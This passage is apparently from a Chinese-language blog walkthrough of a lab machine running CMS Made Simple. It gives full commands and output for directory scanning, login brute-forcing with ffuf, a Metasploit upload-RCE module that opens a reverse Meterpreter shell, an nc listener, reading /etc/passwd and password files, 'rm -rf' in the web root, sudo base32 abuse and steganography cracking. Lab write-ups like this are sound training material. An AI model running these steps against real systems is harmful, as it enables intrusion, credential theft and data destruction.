Upload Remote Code Execution (Metasploit)                                                    | php/remote/<span class="number">46627</span>.rb</span><br><span class="line">CMS Made Simple <span class="number">0.10</span> - <span class="string">&#x27;index.php&#x27;</span> Cross<span class="literal">-Site</span> Scripting                                                                               | php/webapps/<span class="number">26298</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">0.10</span> - <span class="string">&#x27;Lang.php&#x27;</span> Remote File Inclusion                                                                               | php/webapps/<span class="number">26217</span>.html</span><br><span class="line">CMS Made Simple <span class="number">1.0</span>.<span class="number">2</span> - <span class="string">&#x27;SearchInput&#x27;</span> Cross<span class="literal">-Site</span> Scripting                                                                            | php/webapps/<span class="number">29272</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.0</span>.<span class="number">5</span> - <span class="string">&#x27;Stylesheet.php&#x27;</span> SQL Injection                                                                                | php/webapps/<span class="number">29941</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.11</span>.<span class="number">10</span> - Multiple Cross<span class="literal">-Site</span> Scripting Vulnerabilities                                                               | php/webapps/<span class="number">32668</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.11</span>.<span class="number">9</span> - Multiple Vulnerabilities                                                                                     | php/webapps/<span class="number">43889</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.2</span> - Remote Code Execution                                                                                           | php/webapps/<span class="number">4442</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.2</span>.<span class="number">2</span> Module TinyMCE - SQL Injection                                                                                  | php/webapps/<span class="number">4810</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.2</span>.<span class="number">4</span> Module FileManager - Arbitrary File Upload                                                                      | php/webapps/<span class="number">5600</span>.php</span><br><span class="line">CMS Made Simple <span class="number">1.4</span>.<span class="number">1</span> - Local File Inclusion                                                                                          | php/webapps/<span class="number">7285</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.6</span>.<span class="number">2</span> - Local File Disclosure                                                                                         | php/webapps/<span class="number">9407</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.6</span>.<span class="number">6</span> - Local File Inclusion / Cross<span class="literal">-Site</span> Scripting                                                                   | php/webapps/<span class="number">33643</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.6</span>.<span class="number">6</span> - Multiple Vulnerabilities                                                                                      | php/webapps/<span class="number">11424</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">1.7</span> - Cross<span class="literal">-Site</span> Request Forgery                                                                                      | php/webapps/<span class="number">12009</span>.html</span><br><span class="line">CMS Made Simple <span class="number">1.8</span> - <span class="string">&#x27;default_cms_lang&#x27;</span> Local File Inclusion                                                                         | php/webapps/<span class="number">34299</span>.py</span><br><span class="line">CMS Made Simple <span class="number">1</span>.x - Cross<span class="literal">-Site</span> Scripting / Cross<span class="literal">-Site</span> Request Forgery                                                               | php/webapps/<span class="number">34068</span>.html</span><br><span class="line">CMS Made Simple <span class="number">2.1</span>.<span class="number">6</span> - <span class="string">&#x27;cntnt01detailtemplate&#x27;</span> Server<span class="literal">-Side</span> Template Injection                                                        | php/webapps/<span class="number">48944</span>.py</span><br><span class="line">CMS Made Simple <span class="number">2.1</span>.<span class="number">6</span> - Multiple Vulnerabilities                                                                                      | php/webapps/<span class="number">41997</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.1</span>.<span class="number">6</span> - Remote Code Execution                                                                                         | php/webapps/<span class="number">44192</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">14</span> - Arbitrary File Upload (Authenticated)                                                                        | php/webapps/<span class="number">48779</span>.py</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">14</span> - Authenticated Arbitrary File Upload                                                                          | php/webapps/<span class="number">48742</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">14</span> - Persistent Cross<span class="literal">-Site</span> Scripting (Authenticated)                                                              | php/webapps/<span class="number">48851</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">15</span> - <span class="string">&#x27;title&#x27;</span> Cross<span class="literal">-Site</span> Scripting (XSS)                                                                           | php/webapps/<span class="number">49793</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">15</span> - RCE (Authenticated)                                                                                          | php/webapps/<span class="number">49345</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">15</span> - Stored Cross<span class="literal">-Site</span> Scripting via SVG File Upload (Authenticated)                                              | php/webapps/<span class="number">49199</span>.txt</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">5</span> - (Authenticated) Remote Code Execution                                                                         | php/webapps/<span class="number">44976</span>.py</span><br><span class="line">CMS Made Simple <span class="number">2.2</span>.<span class="number">7</span> - (Authenticated) Remote Code Execution                                                                         | php/webapps/<span class="number">45793</span>.py</span><br><span class="line">CMS Made Simple &lt; <span class="number">1.12</span>.<span class="number">1</span> / &lt; <span class="number">2.1</span>.<span class="number">3</span> - Web Server Cache Poisoning                                                                       | php/webapps/<span class="number">39760</span>.txt</span><br><span class="line">CMS Made Simple &lt; <span class="number">2.2</span>.<span class="number">10</span> - SQL Injection                                                                                              | php/webapps/<span class="number">46635</span>.py</span><br><span class="line">CMS Made Simple Module Antz Toolkit <span class="number">1.02</span> - Arbitrary File Upload                                                                      | php/webapps/<span class="number">34300</span>.py</span><br><span class="line">CMS Made Simple Module Download Manager <span class="number">1.4</span>.<span class="number">1</span> - Arbitrary File Upload                                                                 | php/webapps/<span class="number">34298</span>.py</span><br><span class="line">CMS Made Simple Showtime2 Module <span class="number">3.6</span>.<span class="number">2</span> - (Authenticated) Arbitrary File Upload                                                        | php/webapps/<span class="number">46546</span>.py</span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>由网站底部可知道版本系统 2.2.5</p>
<h2 id="4-渗透进行…"><a href="#4-渗透进行…" class="headerlink" title="4.渗透进行…"></a>4.渗透进行…</h2><p>查看脚本</p>
<p><img src="/../pic/image-20230730164225680.png" alt="image-20230730164225680"></p>
<p>逃不过扫描目录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">usr</span>/…/<span class="type">exploitdb</span>/<span class="type">exploits</span>/<span class="type">php</span>/<span class="type">webapps</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.138/ -x php,txt,html</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.138</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Extensions:              php,txt,html</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">30</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">05</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/.html                (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/index.php            (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">19507</span>]</span><br><span class="line">/modules              (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">318</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">modules</span>/]</span><br><span class="line">/uploads              (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">318</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">uploads</span>/]</span><br><span class="line">/doc                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">314</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">doc</span>/]</span><br><span class="line">/admin                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">316</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">admin</span>/]</span><br><span class="line">/assets               (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">317</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">assets</span>/]</span><br><span class="line">/lib                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">314</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">lib</span>/]</span><br><span class="line">/config.php           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">0</span>]</span><br><span class="line">/tmp                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">314</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">tmp</span>/]</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/.html                (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/server<span class="literal">-status</span>        (Status: <span class="number">403</span>) [<span class="type">Size</span></span><br></pre></td></tr></table></figure>

<p><img src="/../pic/image-20230730165020459.png" alt="image-20230730165020459"></p>
<p>burpsuite抓包爆破</p>
<p>那么根据网站尝试生成一个字典跑一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面]</span><br><span class="line">└─<span class="comment"># cewl -d 2  -with-numbers -m 4 http://192.168.56.138/index.php -w dict.txt</span></span><br><span class="line"></span><br><span class="line">CeWL <span class="number">5.5</span>.<span class="number">2</span> (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>

<p>burpsuite爆破</p>
<p><img src="/../pic/image-20230730165800603.png" alt="image-20230730165800603"></p>
<p>fuzz爆破</p>
<p>用rockyou.txt</p>
<p>burpsuite跑不动</p>
<p>跑炸了</p>
<p>换个字典</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ffuf -u &quot;http://192.168.56.138/admin/login.php&quot; \ </span></span><br><span class="line"> <span class="literal">-X</span> POST <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \    </span><br><span class="line"> <span class="literal">-d</span> <span class="string">&quot;username=admin&amp;password=FUZZ&amp;loginsubmit=%E6%8F%90%E4%BA%A4&quot;</span> \</span><br><span class="line"> <span class="literal">-w</span> /usr/share/wordlists/seclists/Passwords/xato<span class="literal">-net-10-million-passwords-10000</span>.txt <span class="literal">-mc</span> <span class="number">302</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : POST</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.56.138/admin/login.php</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"> :: Data             : username=admin&amp;password=FUZZ&amp;loginsubmit=%E6%8F%90%E4%BA%A4</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 302</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]</span></span><br><span class="line"><span class="string">    * FUZZ: bullshit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [10000/10000] :: Job [1/1] :: 324 req/sec :: Duration: [0:00:34] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>用msf试试(注：设置同一个网卡)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> username admin</span><br><span class="line">username =&gt; admin</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> password bullshit</span><br><span class="line">password =&gt; bullshit</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> targeturi /</span><br><span class="line">targeturi =&gt; /</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">181.139</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[+] The target appears to be vulnerable.</span><br><span class="line">[!] This exploit may require manual cleanup of <span class="string">&#x27;kMhoUSjV.txt&#x27;</span> on the target</span><br><span class="line">[!] This exploit may require manual cleanup of <span class="string">&#x27;kMhoUSjV.php&#x27;</span> on the target</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[+] The target appears to be vulnerable.</span><br><span class="line">[*] Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">[+] Deleted nZmkekLBlqD.txt</span><br><span class="line">[+] Deleted nZmkekLBlqD.php</span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span>.<span class="number">56.138</span>:<span class="number">44910</span>) at <span class="number">2023</span><span class="literal">-07-30</span> <span class="number">17</span>:<span class="number">54</span>:<span class="number">58</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 8888                   </span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8888</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.138</span>] <span class="number">54744</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html/uploads<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">DJLyyxtACv.php  KstZChBgtC.php  fEFiROwR.txt  kMhoUSjV.txt     soFxiwbFZHp.txt</span><br><span class="line">DJLyyxtACv.txt  KstZChBgtC.txt  images        ngrey</span><br><span class="line">KZvdsAvK.php    NCleanBlue      index.html    simplex</span><br><span class="line">KZvdsAvK.txt    fEFiROwR.php    kMhoUSjV.php  soFxiwbFZHp.php</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html/uploads<span class="variable">$</span> <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html<span class="variable">$</span> <span class="built_in">cat</span> /etc/passwd | grep /bin/bash</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep /bin/bash</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">paul:x:<span class="number">1001</span>:<span class="number">1001</span>:,,,:/home/paul:/bin/bash</span><br><span class="line">nico:x:<span class="number">1000</span>:<span class="number">1000</span>:,,,:/home/nico:/bin/bash</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html<span class="variable">$</span> <span class="built_in">rm</span> <span class="literal">-rf</span> ./*</span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-rf</span> ./*</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html<span class="variable">$</span> <span class="built_in">cd</span> /home/paul</span><br><span class="line"><span class="built_in">cd</span> /home/paul</span><br><span class="line">www<span class="literal">-data</span>@debian:/home/paul<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">password.txt</span><br><span class="line">www<span class="literal">-data</span>@debian:/home/paul<span class="variable">$</span> <span class="built_in">cat</span> password.txt    </span><br><span class="line"><span class="built_in">cat</span> password.txt</span><br><span class="line">Password is: YouCanBecomePaul</span><br><span class="line">www<span class="literal">-data</span>@debian:/home/paul<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<p>ssh连接一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/ace]</span><br><span class="line">└─# ssh paul@192.168.56.138                                            </span><br><span class="line">The authenticity of host &#x27;192.168.56.138 (192.168.56.138)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:lceOIwdNewht9GK+znSKUwdNJEHgPsE9TvClQ1KEELA.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.56.138&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">paul@192.168.56.138&#x27;s password: </span><br><span class="line">Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Apr  2 09:49:06 2021 from 192.168.0.25</span><br><span class="line">paul@debian:~$ ls</span><br><span class="line">password.txt</span><br><span class="line">paul@debian:~$ </span><br></pre></td></tr></table></figure>

<p>paul连接成功了，但是我们更需要nico</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">paul@debian:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">[<span class="type">sudo</span>] Mot de passe de paul : </span><br><span class="line">Entrées par défaut pour paul sur debian :</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">L<span class="string">&#x27;utilisateur paul peut utiliser les commandes suivantes sur debian :</span></span><br><span class="line"><span class="string">    (nico) /usr/bin/base32</span></span><br><span class="line"><span class="string">paul@debian:~$ ls -al /home/nico</span></span><br><span class="line"><span class="string">total 32</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 nico nico 4096 avril  1  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 4 root root 4096 avril  1  2021 ..</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root    9 avril  1  2021 .bash_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 nico nico  220 avril  1  2021 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 nico nico 3526 avril  1  2021 .bashrc</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 nico nico 4096 avril  1  2021 .local</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 nico nico  807 avril  1  2021 .profile</span></span><br><span class="line"><span class="string">-rwx------ 1 nico nico   37 avril  1  2021 .secret.txt</span></span><br><span class="line"><span class="string">-rwx------ 1 nico nico   11 avril  1  2021 user.txt</span></span><br><span class="line"><span class="string">paul@debian:~$ sudo -u nico /usr/bin/base32 /home/nico/user.txt</span></span><br><span class="line"><span class="string">M5QW22DBNZQXE2DVBI======</span></span><br><span class="line"><span class="string">paul@debian:~$ echo &quot;M5QW22DBNZQXE2DVBI======&quot; |base32 d</span></span><br><span class="line"><span class="string">base32: d: Aucun fichier ou dossier de ce type</span></span><br><span class="line"><span class="string">paul@debian:~$ echo &quot;M5QW22DBNZQXE2DVBI======&quot; |base32 -d</span></span><br><span class="line"><span class="string">gamhanarhu</span></span><br><span class="line"><span class="string">paul@debian:~$ </span></span><br></pre></td></tr></table></figure>

<p>┗|｀O′|┛ 嗷~~！！！</p>
<h2 id="5-sudo提权"><a href="#5-sudo提权" class="headerlink" title="5.sudo提权"></a>5.sudo提权</h2><p>在根目录nico中有张照片，nico密码：just_one_more_beer</p>
<p>scp下载看一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># scp nico@192.168.56.138:/nico/homer.jpg  /home/ace/桌面 </span></span><br><span class="line">nico@<span class="number">192.168</span>.<span class="number">56.138</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">homer.jpg                                                                                                       100%   46KB   2.1MB/s   00:00    </span></span><br><span class="line"><span class="string">             </span></span><br></pre></td></tr></table></figure>

<p><img src="/../pic/image-20230730184807502.png" alt="image-20230730184807502"></p>
<p>homer!!!!!</p>
<p>隐写瞧一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面]</span><br><span class="line">└─<span class="comment"># stegseek homer.jpg /usr/share/wordlists/rockyou.txt</span></span><br><span class="line">StegSeek <span class="number">0.6</span> - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Found passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[<span class="type">i</span>] Original filename: <span class="string">&quot;note.txt&quot;</span>.</span><br><span class="line">[<span class="type">i</span>] Extracting to <span class="string">&quot;homer.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面]</span><br><span class="line">└─<span class="comment"># cat homer.jpg.out </span></span><br><span class="line">my /tmp/goodgame file was so good... but I lost it </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现&#x2F;tmp&#x2F;goodgame这里有漏洞，可以试试看</p>
<p>写个反弹shell吧</p>
